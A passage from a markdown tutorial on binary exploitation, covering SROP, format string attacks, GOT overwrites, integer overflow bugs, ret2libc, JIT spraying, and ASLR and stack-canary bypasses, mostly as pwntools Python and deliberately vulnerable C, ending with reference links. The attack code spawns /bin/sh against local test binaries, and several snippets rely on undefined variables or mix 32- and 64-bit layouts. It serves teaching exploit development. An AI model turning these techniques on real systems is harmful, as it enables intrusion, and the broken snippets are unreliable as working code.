    pop_rdi, bin_sh,
    system
])
```

### SROP (Sigreturn-Oriented Programming)

**Basic SROP Exploitation**
```python
# SROP uses sigreturn syscall to control all registers
from pwn import *

context.arch = 'amd64'

# Create sigreturn frame
frame = SigreturnFrame()
frame.rax = 59              # execve syscall
frame.rdi = bin_sh_addr     # /bin/sh address
frame.rsi = 0               # argv
frame.rdx = 0               # envp
frame.rip = syscall_gadget  # instruction pointer

# SROP chain
srop_payload = flat([
    pop_rax, 15,            # sigreturn syscall number
    syscall_ret,            # trigger sigreturn
    bytes(frame)            # sigreturn frame
])

payload = b"A" * 72 + srop_payload
```

## 13. Format String Vulnerabilities

### Format String Basics

Format string vulnerabilities occur when user input is passed directly to printf-family functions.

**Information Disclosure**
```c
// Vulnerable code
#include <stdio.h>

int secret = 0x12345678;

int main() {
    char buffer[100];
    fgets(buffer, sizeof(buffer), stdin);
    printf(buffer);  // Vulnerability: user controls format string
    return 0;
}
```

**Exploitation Techniques**
```python
#!/usr/bin/env python3
from pwn import *

p = process('./format_vuln')

# 1. Stack disclosure - read values from stack
payload = b"%x " * 20  # Dump 20 stack values
p.sendline(payload)
stack_dump = p.recvline()
print("Stack values:", stack_dump.decode())

# 2. Arbitrary read - read from specific address
target_addr = 0x601040
payload = f"%{7}$s".encode() + p64(target_addr)
p.sendline(payload)

# 3. Arbitrary write - write to specific address
target_addr = 0x601040
value = 0x41414141

# Calculate format string for write
payload = fmtstr_payload(6, {target_addr: value})
p.sendline(payload)
```

**Advanced Format String Techniques**

*Partial Overwrites*
```python
# Overwrite only part of an address to bypass ASLR
def partial_overwrite_exploit():
    # Assume we want to change 0x7ffff7a52000 to 0x7ffff7a52123
    # Only need to overwrite lower 2 bytes
    
    target_addr = 0x7fffffffe008  # Address containing the pointer
    new_value = 0x2123            # New lower 2 bytes
    
    # Format string to write 2 bytes
    payload = f"%{new_value}c%{offset}$hn".encode()
    payload += p64(target_addr)
    
    return payload

# Chain multiple writes for larger values
def multi_write_exploit():
    target = 0x601040
    value = 0x1234567890abcdef
    
    writes = {
        target:     value & 0xffff,         # Lower 2 bytes
        target + 2: (value >> 16) & 0xffff, # Next 2 bytes  
        target + 4: (value >> 32) & 0xffff, # Next 2 bytes
        target + 6: (value >> 48) & 0xffff  # Upper 2 bytes
    }
    
    payload = fmtstr_payload(6, writes)
    return payload
```

*GOT Overwrite via Format String*
```python
# Overwrite Global Offset Table entries
def got_overwrite():
    # Target: overwrite printf@got with system address
    printf_got = elf.got['printf']
    system_addr = libc.symbols['system']
    
    # First, leak libc to calculate system address
    leak_payload = f"%{printf_got_offset}$s".encode()
    p.sendline(leak_payload)
    
    # Parse leak and calculate system
    leaked = u64(p.recvline().strip().ljust(8, b'\x00'))
    libc.address = leaked - libc.symbols['printf']
    system = libc.address + libc.symbols['system']
    
    # Overwrite printf@got with system
    payload = fmtstr_payload(6, {printf_got: system})
    p.sendline(payload)
    
    # Now printf calls are system calls
    p.sendline(b"/bin/sh")  # This becomes system("/bin/sh")
```

### FORTIFY_SOURCE Bypass

```c
// Bypassing FORTIFY_SOURCE protections
#include <stdio.h>
#include <string.h>

// FORTIFY_SOURCE adds runtime checks
// Bypass by using indirect calls or confusing the analyzer

void vulnerable_function() {
    char buffer[10];
    char input[100];
    
    fgets(input, sizeof(input), stdin);
    
    // Direct call - FORTIFY_SOURCE will protect
    // strcpy(buffer, input);  // This would be caught
    
    // Indirect call - may bypass protection
    void (*func_ptr)(char*, const char*) = strcpy;
    func_ptr(buffer, input);  // May not be caught
}
```

## 14. Integer Overflow Exploitation

### Integer Vulnerabilities

**Basic Integer Overflow**
```c
// Integer overflow leading to buffer overflow
#include <stdlib.h>
#include <string.h>

void vulnerable_malloc(unsigned int size) {
    // Integer overflow in size calculation
    unsigned int total_size = size + sizeof(int);  // Can overflow
    
    if (total_size < size) {
        // Some implementations check for this
        return;
    }
    
    char* buffer = malloc(total_size);
    if (!buffer) return;
    
    // Store size at beginning
    *(unsigned int*)buffer = size;
    
    // Copy user data - if total_size overflowed, this will overflow heap
    memcpy(buffer + sizeof(int), user_data, size);
}

// Exploit: pass size = 0xFFFFFFFC
// total_size = 0xFFFFFFFC + 4 = 0x100000000 = 0 (32-bit overflow)
// malloc(0) may return valid pointer
// memcpy will copy 0xFFFFFFFC bytes -> heap overflow
```

**Signed vs Unsigned Confusion**
```c
int copy_data(char* dest, char* src, int len) {
    // Vulnerability: signed len can be negative
    if (len > MAX_COPY_SIZE) {
        return -1;  // Reject large sizes
    }
    
    // If len is negative, this check passes but memcpy sees large unsigned value
    memcpy(dest, src, len);  // len cast to size_t (unsigned)
    return 0;
}

// Exploit: pass len = -1
// Check: -1 > MAX_COPY_SIZE is false, so check passes  
// memcpy: -1 cast to size_t becomes 0xFFFFFFFF -> huge copy
```

**Width Conversion Vulnerabilities**
```c
// Truncation during type conversion
void process_length(unsigned short net_len) {
    // Network data is 16-bit length
    unsigned int host_len = ntohs(net_len);  // Convert to host byte order
    
    if (host_len > 1024) {
        return;  // Reject large lengths
    }
    
    char* buffer = malloc(host_len);
    
    // Read data - but actual network length might be different size
    read_network_data(buffer, net_len);  // Uses original 16-bit value
}

// If attacker controls both net_len and actual data size separately,
// they can pass validation with small host_len but send large data
```

### Exploitation Techniques

**Heap Overflow via Integer Overflow**
```python
#!/usr/bin/env python3

# Exploit integer overflow to cause heap overflow
def integer_overflow_exploit():
    # Target allocation: malloc(user_size + header_size)
    # If user_size = 0xFFFFFFFC and header_size = 4:
    # Result = 0xFFFFFFFC + 4 = 0x100000000 = 0 (on 32-bit)
    
    user_size = 0xFFFFFFFC
    
    # Send size that will cause integer overflow
    payload = struct.pack("<I", user_size)
    
    # Follow with data that will overflow the small allocated buffer
    overflow_data = b"A" * 1000  # Much larger than the 0-byte allocation
    
    return payload + overflow_data

# More complex: array indexing overflow
def array_index_overflow():
    # Target: array[user_index] where user_index can overflow
    # If array is at 0x1000 and element size is 8:
    # array[0x20000000] = 0x1000 + (0x20000000 * 8) 
    # = 0x1000 + 0x100000000 = 0x1000 (on 32-bit due to overflow)
    
    # This allows writing to array[0] by using large index
    malicious_index = 0x20000000
    payload = struct.pack("<I", malicious_index)
    payload += struct.pack("<Q", 0x4141414141414141)  # Value to write
    
    return payload
```

**Bypassing Size Checks**
```c
// Common vulnerable pattern
void secure_copy(char* dest, size_t dest_size, char* src, size_t src_size) {
    // Check seems secure
    if (src_size > dest_size) {
        return;
    }
    
    // But what if src_size underflows?
    size_t copy_len = src_size - 1;  // Remove null terminator
    memcpy(dest, src, copy_len);
    dest[copy_len] = '\0';
}

// Exploit: if src_size = 0
// copy_len = 0 - 1 = 0xFFFFFFFF (underflow)
// memcpy copies huge amount of data
```

**Time-of-Check Time-of-Use (TOCTOU) with Integers**
```c
// TOCTOU vulnerability with shared integer
volatile int shared_size = 0;

void thread1() {
    // Check
    if (shared_size > MAX_SIZE) {
        return;
    }
    
    // ... time gap ...
    
    // Use - but shared_size might have changed
    char* buffer = malloc(shared_size);
    read_data(buffer, shared_size);
}

void thread2() {
    // Attacker thread changes size after check but before use
    shared_size = 0x7FFFFFFF;  // Very large value
}
```

## 15. Memory Protection Bypasses

### DEP/NX Bypass Techniques

**Return-to-libc**
```python
# Chain library functions to bypass NX
def ret2libc_chain():
    # Basic ret2libc: call system("/bin/sh")
    system_addr = libc.symbols['system']
    bin_sh_addr = next(libc.search(b'/bin/sh'))
    exit_addr = libc.symbols['exit']
    
    payload = flat([
        b"A" * 72,          # Padding
        system_addr,        # Return to system()
        exit_addr,          # Return address for system()
        bin_sh_addr         # Argument to system()
    ])
    
    return payload

# Advanced: chaining multiple function calls
def advanced_ret2libc():
    # Chain: mprotect() to make stack executable, then shellcode
    mprotect = libc.symbols['mprotect']
    stack_page = stack_addr & ~0xfff  # Align to page boundary
    
    rop_chain = flat([
        # Call mprotect(stack_page, 4096, PROT_READ|PROT_WRITE|PROT_EXEC)
        pop_rdi, stack_page,
        pop_rsi, 4096,
        pop_rdx, 7,          # PROT_READ|PROT_WRITE|PROT_EXEC
        mprotect,
        
        # Jump to shellcode on now-executable stack
        stack_addr + 200     # Where we place shellcode
    ])
    
    return rop_chain + shellcode
```

**JIT Spraying**
```javascript
// JIT spraying in browser exploitation
function spray_shellcode() {
    // JIT compiler will generate native code containing our shellcode
    var shellcode_int = 0x90909090;  // NOP sled as integer
    
    // Create function that will be JIT compiled
    function jit_target(x) {
        var result = 0;
        
        // Operations that generate predictable assembly
        result += shellcode_int;
        result ^= 0x41414141;
        result += shellcode_int;
        result ^= 0x42424242;
        
        return result;
    }
    
    // Trigger JIT compilation
    for (var i = 0; i < 100000; i++) {
        jit_target(i);
    }
    
    // Now the JIT code contains our shellcode bytes
    // Need to find and jump to the JIT code region
}
```

### ASLR Bypass Techniques

**Information Leaks**
```python
# Leak stack addresses via format string
def leak_stack_addr():
    # %p prints pointer values from stack
    payload = b"%6$p"  # Print 6th argument (stack value)
    p.sendline(payload)
    
    leak = int(p.recvline().strip(), 16)
    stack_base = leak & ~0xfff  # Align to page
    return stack_base

# Leak heap addresses via UAF
def leak_heap_addr():
    # Allocate and free object with function pointer
    chunk1 = malloc(64)
    free(chunk1)
    
    # Allocate same size - gets same chunk
    chunk2 = malloc(64)
    
    # Read freed data to leak heap addresses
    leaked_data = read_chunk(chunk2)
    heap_addr = struct.unpack("<Q", leaked_data[:8])[0]
    
    return heap_addr

# Partial overwrite to bypass ASLR
def partial_overwrite():
    # Only overwrite lower bytes of return address
    # ASLR typically doesn't randomize lower 12 bits
    
    # Original: 0x7ffff7a52abc
    # Target:   0x7ffff7a52def  (same page, different offset)
    
    payload = b"A" * 72
    payload += b"\xef\x2d"  # Only overwrite lower 2 bytes
    
    return payload
```

**ASLR Brute Force**
```python
# Brute force ASLR on 32-bit systems
def aslr_bruteforce():
    # 32-bit ASLR has limited entropy
    # Stack: ~8 bits, Heap: ~8 bits, Libraries: ~8 bits
    
    target_addr = 0x08048000  # Fixed binary address
    
    for attempt in range(256):  # Try all possible stack positions
        try:
            p = process('./vulnerable')
            
            # Craft payload with guessed address
            guessed_addr = 0xbffff000 + (attempt * 0x1000)
            payload = craft_payload(guessed_addr)
            
            p.sendline(payload)
            
            # Check if exploit succeeded
            if b"shell" in p.recv(timeout=1):
                log.success(f"Success with address: {hex(guessed_addr)}")
                return p
                
            p.close()
            
        except:
            continue
    
    log.error("Brute force failed")
```

### Stack Canary Bypass

**Canary Leak and Overwrite**
```python
# Leak canary via format string
def leak_canary():
    # Stack layout: [buffer][canary][saved rbp][return addr]
    # Canary is typically at known offset from buffer
    
    # Find canary position (varies by binary)
    for offset in range(10, 30):
        payload = f"%{offset}$p".encode()
        p.sendline(payload)
        
        leak = p.recvline().strip()
        if leak.startswith(b"0x"):
            value = int(leak, 16)
            
            # Canaries typically end in 0x00 and have high entropy
            if (value & 0xff) == 0 and value > 0x10000:
                log.info(f"Potential canary at offset {offset}: {hex(value)}")
                return value
    
    return None

# Forge canary in payload
def bypass_canary():
    canary = leak_canary()
    
    payload = flat([
        b"A" * 1032,       # Buffer overflow to canary
        canary,             # Correct canary value
        b"B" * 8,          # Saved RBP
        target_addr         # Return address
    ])
    
    return payload
```

**Canary Brute Force (32-bit)**
```python
# Brute force canary byte by byte
def bruteforce_canary():
    canary = b"\x00"  # Canaries end with null byte
    
    # Brute force each byte (3 bytes for 32-bit canary)
    for byte_pos in range(3):
        for byte_val in range(256):
            try:
                p = process('./vulnerable')
                
                # Build partial canary
                test_canary = canary + bytes([byte_val])
                
                payload = b"A" * 1032 + test_canary
                p.sendline(payload)
                
                # If canary is correct, program continues normally
                # If wrong, program crashes with stack smashing detected
                response = p.recv(timeout=1)
                
                if b"stack smashing detected" not in response:
                    canary = test_canary
                    log.info(f"Found canary byte {byte_pos}: {hex(byte_val)}")
                    p.close()
                    break
                    
                p.close()
                
            except:
                continue
    
    return canary
```

---

## References and Resources

- [Modern Binary Exploitation by RPISEC](https://github.com/RPISEC/MBE)
- [The Shellcoder's Handbook](https://www.wiley.com/en-us/The+Shellcoder%27s+Handbook%3A+Discovering+and+Exploiting+Security+Holes%2C+2nd+Edition-p-9780470080238)
- [Hacking: The Art of Exploitation](https://nostarch.com/hacking2.htm)
- [Binary Exploitation Course Materials](https://github.com/nnamon/linux-exploitation-course)
- [Live Overflow Binary Exploitation Playlist](https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN)
- [Exploit Development Community](https://discord.gg/exploit-dev)
